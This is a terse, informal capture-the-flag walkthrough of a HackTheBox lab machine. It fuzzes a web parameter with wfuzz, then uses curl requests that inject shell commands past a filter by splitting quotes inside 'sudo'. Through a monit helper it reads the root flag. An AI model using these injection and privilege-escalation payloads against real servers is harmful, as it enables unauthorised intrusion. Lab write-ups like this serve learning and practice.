nothing was ovious so on dong curl -IÂ  it showed xdebug 2.5.5

now we did a ==wfuzz== to find which papameter give /etc/passwd

`wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "User-Agent: nothingtoseehere" --hh=19 "http://fluxcapacitor.htb/sync?FUZZ=test"`

on gobuster we found it had some ==protection== for lfi

`curl "10.10.10.69/sync?opt=' su''do -l'"`

`curl "10.10.10.69/sync?opt=' su''do /home/themiddle/.monit cmd $(echo cat /root/root.txt | base64)'"`
